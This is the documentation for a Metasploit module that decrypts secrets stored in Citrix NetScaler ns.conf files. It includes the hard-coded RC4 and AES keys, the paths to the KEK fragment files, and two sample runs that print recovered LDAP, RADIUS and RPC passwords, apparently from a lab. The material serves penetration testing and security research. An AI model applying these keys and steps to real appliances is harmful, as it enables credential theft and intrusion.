This module takes a Citrix NetScaler `ns.conf` configuration file as input and extracts secrets that
have been stored with reversible encryption. The module supports legacy NetScaler encryption (RC4)
as well as the newer AES-256-ECB and AES-256-CBC encryption types. It is also possible to decrypt
secrets protected by the Key Encryption Key (KEK) method, provided the key fragment files F1.key
and F2.key are provided. Currently, keys for appliances in FIPS mode or running hardware HSM cannot 
be extracted. Root access to a NetScaler device or access to a NetScaler configuration backup are
the most effective means of acquiring the configuration file and key fragments.

This module incorporates research published by dozer:

https://dozer.nz/posts/citrix-decrypt/

## Vulnerable Application
This module is tested against the configuration files for NetScaler versions 10.x, 11x, 12.x and
13.x. The module will work with files retrieved from a live NetScaler system as well as files
extracted from an unencrypted NetScaler backup archive. This is possible because NetScaler uses
well-known hard coded encryption keys which are visible on the system in the hidden file:

`/nsconfig/.skf`

These static keys are:

```
NetScaler RC4:
  2286da6ca015bcd9b7259753c2a5fbc2
NetScaler AES:
  351cbe38f041320f22d990ad8365889c7de2fcccae5a1a8707e21e4adccd4ad9
```
The module is also able to decrypt secrets encrypted with NetScaler KEK, provided the associated
`F1.key` and `F2.key` fragments are provided. Private key passphrases that use `-passcrypt` are not
currently decryptable by this module, but any secret that uses the `-encrypted` parameter should be
fully recoverable.

## Verification Steps
You must possess a NetScaler `ns.conf` file in order to use this module. If the NetScaler is running
NS13.0 Build76.xx.nc or higher, or the administrator has configured KEK encryption, you must also
possess the associated KEK key fragments in order to decrypt the file. All files must be local to
the system invoking the module. Where possible, you should provide the `NS_IP` option to tag
relevant loot entries with the IPv4 address of the originating system. If no value is provided for
`NS_IP` the module defaults to assigning the loopback IP `127.0.0.1`.

1. Acquire the `ns.conf` file, and associated `F1.key` and `F2.key` files if using NS KEK
2. Start msfconsole
3. Do: `modules/auxiliary/admin/citrix/citrix_netscaler_config_decrypt.rb`
4. Do: `set ns_conf <path to ns.conf>` to provide the location of the NetScaler config file
5. Do: `set ns_kek_f1 <path to f1.key>` if you are decrypting a file using NS KEK
6. Do: `set ns_kek_f2 <path to f2.key>` if you are decrypting a file using NS KEK
6. Do: `set ns_ip <NetScaler IPv4>` to attach the target NetScaler IPv4 address to loot entries
7. Do: `dump`

## Options
**NS_CONF**

Path to the NetScaler configuration file on the local system. Example: `/tmp/ns.conf`

**NS_KEK_F1**

Path to the first of two NS KEK fragments, if decrypting NS KEK. Example: `/tmp/F1.key`

**NS_KEK_F2**

Path to the second  of two NS KEK fragments, if decrypting NS KEK. Example: `/tmp/F2.key`

**NS_IP**

Optional parameter to set the IPv4 address associated with loot entries made by the module.

## Scenarios

### Acquire NetScaler Config File
NetScaler configuration files can be retrieved from a live system by running

`show ns.conf`

From the nscli or

`cat /nsconfig/ns.conf`

from the BSD shell. These files can also be retrieved from NetScaler configuration backup
archives which are generated from the appliance admin interface.

### Acquire KEK Fragment Files
As of NS13.0 Build76.xx.nc NetScaler requires mandatory use of the Key Encryption Key (KEK)
scheme. If secrets within the config file use KEK, you must also posses the associated KEK F1
and F2 fragment files in order to perform decryption. Secrets that require KEK fragments to
decrypt will include the `-kek` parameter on the associated configuration line. It is possible
for an admin to manually enable KEK in NS builds prior to Build76.xx.nc - if this has been done,
the current KEK key fragments are located in the following paths:

`/nsconfig/F1.key`
`/nsconfig/F2.key`

After NS13.0 Build76.xx.nc, KEK is mandatory and managed by the NetScaler itself. Key fragments
are presumably regenerated during firmware upgrades, and a journal is maintained in `/nsconfig/keys`
suffixed with a date stamp. The `F1.key` and `F2.key` files are ignored, and the new "current" KEK
key is stored in hidden files at paths:

`/nsconfig/.F1.key`
`/nsconfig/.F2.key`

As well as under `/nsconfig/keys`. Note that both fragments must be provided for successful
decryption. The module can be run without providing KEK fragments, but will be unable to decrypt
any secrets that use KEK encryption. An unencrypted NetScaler backup archive will contain all KEK
fragments currently defined on the appliance as well as the current `ns.conf` file.

### Running the Module

Example run against config file without KEK from NetScaler VPX running NS11.0 Build 62.10.nc:
```
msf6 > use modules/auxiliary/admin/citrix/citrix_netscaler_config_decrypt
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > set ns_conf /tmp/ns.conf.NS11.0-62.10.conf
ns_conf => /tmp/ns.conf.NS11.0-62.10.conf
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > dump

[*] Config line:
add ssl certKey netscaler_cesium137_io -cert netscaler_cesium137_io.pem -key netscaler_cesium137_io.key -passcrypt "VbuAvo9nq18Zap0joBBv1a1Chm5BOerJ3GhYWU+Wbv0=" -expiryMonitor DISABLED
[!] Not decrypting passcrypt entry:
[!] Ciphertext: VbuAvo9nq18Zap0joBBv1a1Chm5BOerJ3GhYWU+Wbv0=
[*] Config line:
set ns encryptionParams -method AES256 -keyValue 7654526a2f3ceffd877b286a8acece43da700d06133dc985f7ebdeb076135bcb755472e04f5d92aba9f07334eb8e936a58782ce76bb3f6d6e44adf727e8e88d602b8bdae1817d26203fe281a8429574d -encrypted -encryptmethod ENCMTHD_3
[+] Plaintext: AAAAAAXyju437Ecnb/iQpa55uUvOskx7S5hCq5dB4kMq+Lcx6g==
[*] Config line:
add authentication radiusAction UTIL1 -serverIP 10.100.10.13 -serverPort 1812 -radKey f8e4f532e9d4e6bebab169b3be9e77b5c851466b7760c469bd64a15d2e8d3c602025c41372094d06e207789d58b6acb7 -encrypted -encryptmethod ENCMTHD_3
[+] Plaintext: hbZaADYDUmdHv7AhHsAb6eCde2M82m0
[*] Config line:
add authentication ldapAction LDAP -serverName ldap.cesium137.io -serverPort 636 -ldapBase "DC=chainheart,DC=com" -ldapBindDn wiz@cesium137.io -ldapBindDnPassword f5dc75680b925dbd3c0a8154c8fee056bfe77ac774797de3c0867d368bd09c2cdd872a36e15a1f07abf773740e2c8a12 -encrypted -encryptmethod ENCMTHD_3 -ldapLoginName sAMAccountName -groupAttrName memberOf -secType SSL -ldapHostname ldap.cesium137.io
[+] User: wiz@cesium137.io
[+] Pass: 2AxDGAhirQWuuGxFpSq9ehFwny81RSm
[*] Config line:
set ns rpcNode 10.100.10.11 -password 9ec84444b10941dc4222f93b29a75f0aa237ffdcc73a81355bf5d1cf3d80058daaad7ca58e488e54bc3ff3eea8ffd9eb -encrypted -encryptmethod ENCMTHD_3 -srcIP 10.100.10.11
[+] Plaintext: 447a325517739063bbaa414ecf1d9c3
[*] Config line:
set ns rpcNode 10.100.10.12 -password dd5c0c4952509e2fcfaeb238dfc361b79a844df09254087920ee0cf4dc447161bde8491d8a39ded0fa2526cc46e6a00f -encrypted -encryptmethod ENCMTHD_3 -srcIP 10.100.10.11
[+] Plaintext: 447a325517739063bbaa414ecf1d9c3
[*] Config line:
add lb monitor mon_ldaps LDAP -scriptName nsldap.pl -dispatcherIP 127.0.0.1 -dispatcherPort 3013 -password e209865546c3d2e8462e3e7a962252eb6d9e26374163c8d902fc3535cb12638c514765dcea4792eb1e3e6b5e1c1c4cef -encrypted -encryptmethod ENCMTHD_3 -LRTM DISABLED -secure YES -baseDN "DC=chainheart,DC=com" -bindDN wiz@cesium137.io -filter CN=builtin
[+] User: wiz@cesium137.io
[+] Pass: 2AxDGAhirQWuuGxFpSq9ehFwny81RSm
[*] Config line:
add lb monitor mon_ldap LDAP -scriptName nsldap.pl -dispatcherIP 127.0.0.1 -dispatcherPort 3013 -password 4ae7bec92e25d985df315e543b846b2c30346840d8e945f5073832c3e479d60eee581f67d671759ae555210529eaec8d -encrypted -encryptmethod ENCMTHD_3 -LRTM DISABLED -destPort 636 -secure YES -baseDN "DC=chainheart,DC=com" -bindDN wiz@cesium137.io -filter CN=builtin
[+] User: wiz@cesium137.io
[+] Pass: 2AxDGAhirQWuuGxFpSq9ehFwny81RSm
[*] Auxiliary module execution completed
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > 
```

Example run against config file using KEK from NetScaler VPX running NS13.0 Build 85.15.nc:

```
msf6 > use modules/auxiliary/admin/citrix/citrix_netscaler_config_decrypt
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > set ns_conf /tmp/ns.conf 
ns_conf => /tmp/ns.conf
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > set ns_kek_f1 /tmp/F1.key
ns_kek_f1 => /tmp/F1.key
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > set ns_kek_f2 /tmp/F2.key
ns_kek_f2 => /tmp/F2.key
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > dump

[*] Building NetScaler KEK from key fragments ...
[+] NS KEK F1
[+]      HEX: dd2588bb3cb20dd643216c33489776c78e8c56f13b1301e0984dc80564eea49e
[+] NS KEK F2
[+]      HEX: 45f9e6780a1dc40b6fe75bedf2f6dbb9a86e4315d07313014fe2381c52e44d8f
[+] Assembled NS KEK AES key
[+]      HEX: 54f202b9a94649fd9eaa3f13eab514a5a267f460db0a2393f8b25f321a7d79e0

[*] Config line:
add ssl certKey netscaler_cesium137_io -cert netscaler_cesium137_io.pem -key netscaler_cesium137_io.key 30f39257d8aacc737182568184e0d535002d90a7aba3454c1e8766a958d3a4a720e485c498adc681f0e7559ff633f932 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -expiryMonitor DISABLED
[+] Plaintext: zgkEUD86rUv76coT0DkIBj1xlp5qEzH
[*] Config line:
add ssl certKey ldap_cesium137_io -cert ldap_cesium137_io.pem -key ldap_cesium137_io.key d7902778370c616480ef781c5b3922ef31bd90e75dd3aecfa0fa8a5bafc4fa16b20ed2f7a07970c3f4d8ba201a3b9b72 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -expiryMonitor ENABLED -notificationPeriod 90
[+] Plaintext: YaqoRLtSnnMPgnWyhAedYv2RO1aVtx8
[*] Config line:
add ssl certKey mail_cesium137_io -cert mail_cesium137_io-g3.pem -key mail_cesium137_io-g3.key 0e5ca2011772a9943c8f4281668b7236a8dfb97da290487d1953fa5ef768272f33d20122b055878729c75c29efaa3291 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -expiryMonitor DISABLED
[+] Plaintext: TBkrkfnP4QOWIT0FX8QCLl2GkNrnM
[*] Config line:
add ssl certKey auth_cesium137_io -cert auth_cesium137_io-g3.pem -key auth_cesium137_io-g3.key d574cca92065da27309ce87a423ac82e0c1571cd4c6df59a725f7eabee97d40136a250152506cb15962e34c90f1dc25c -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -expiryMonitor DISABLED
[+] Plaintext: flEkB3SW4YTTi9HRNnffmvJLSgJhsz5
[*] Config line:
set ns encryptionParams -method AES256 -keyValue ec5d48485c6871d1d4a2b01f9126946c53aa49eae721c8114ba7a34a1b1f8eabd443a9d641bbf5ef67f2b0237c481673587846db5378f72f9025f0762f8f9cbeebf4a16aaa2782d5c6ecd90c48a1c30d -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35
[+] Plaintext: AAAAAAXyju437Ecnb/iQpa55uUvOskx7S5hCq5dB4kMq+Lcx6g==
[*] Config line:
add authentication radiusAction APP01_DUO -serverIP 10.100.10.13 -serverPort 11812 -authTimeout 60 -radKey 535587632ffe91f2559fcf5902c7e4bf24961ee2e7f6285c03c87c2e65165fbc -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -accounting ON
[+] Plaintext: IAmSam!
[*] Config line:
add authentication radiusAction APP01_DUO_CITRIXRECEIVER -serverIP 10.100.10.13 -serverPort 21812 -authTimeout 60 -radKey 6644f481004ac7dee5a05b5a8dc3d9d9ae8c76f5fe82e0430b43acd7fb5afe9c -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -accounting ON
[+] Plaintext: IAmSam!
[*] Config line:
add authentication ldapAction AD_DUA2FAUSERS -serverName ldap.cesium137.io -serverPort 636 -authTimeout 60 -ldapBase "DC=cesium137,DC=io" -ldapBindDn ldap@cesium137.io -ldapBindDnPassword 7fbbf2ef9665641264406c17673c0cdb5774b76454f3ac8c7bb067dd0d2228c5 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -ldapLoginName sAMAccountName -searchFilter "&(objectCategory=user)(memberOf=CN=2FA-OWA,CN=Users,DC=cesium137,DC=io)" -groupAttrName memberOf -subAttributeName cn -secType SSL -passwdChange ENABLED -nestedGroupExtraction ON -groupNameIdentifier sAMAccountName -groupSearchAttribute memberOf -groupSearchSubAttribute CN
[+] User: ldap@cesium137.io
[+] Pass: Gr33n3gg$
[*] Config line:
set ns rpcNode 192.168.10.14 -password 2634fa338c457cb32fdf245873874a9b8fcd7128f6534641f49ea650e9f0974b -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -srcIP 192.168.10.14
[+] Plaintext: SamIAm!
[*] Config line:
set ns rpcNode 192.168.10.15 -password 6955e686fc5dd3beee5013dad0e0fa6510a56029b52cc7d7ed15082a60ec6ce4 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -srcIP 192.168.10.14
[+] Plaintext: SamIAm!
[*] Config line:
add lb monitor mon_ldaps LDAP -scriptName nsldap.pl -dispatcherIP 127.0.0.1 -dispatcherPort 3013 -password cc1f6bb054f5d63d5eb871fdd36ff573f3343c1e0238965682460c6f084d1e14-encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -LRTM DISABLED -secure YES -baseDN "DC=cesium137,DC=io" -bindDN ldap@cesium137.io -filter CN=builtin -devno 13862
[+] User: ldap@cesium137.io
[+] Pass: Gr33n3gg$
[*] Config line:
add lb monitor mon_ldap LDAP -scriptName nsldap.pl -dispatcherIP 127.0.0.1 -dispatcherPort 3013 -password 5c35e0aa5c3d999e9ff10de1fa32910f9ac28b1ee8824c2301ac964e1f5f987e-encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35 -LRTM DISABLED -destPort 636 -secure YES -baseDN "DC=cesium137,DC=io" -bindDN ldap@cesium137.io -filter CN=builtin -devno 13863
[+] User: ldap@cesium137.io
[+] Pass: Gr33n3gg$
[*] Config line:
add lb monitor mon-radius RADIUS -respCode 2 -userName ldap -password fda3a1c5990558d4bfae059f27191f4c91a2dfa826d7318db287e109f5da39f9 -encrypted -encryptmethod ENCMTHD_3 -kek -suffix 2022_05_18_14_00_35  -LRTM DISABLED -resptimeout 4 -destPort 1812 -devno 13864
[+] User: ldap
[+] Pass: Gr33n3gg$
[*] Auxiliary module execution completed
msf6 auxiliary(admin/citrix/citrix_netscaler_config_decrypt) > 
```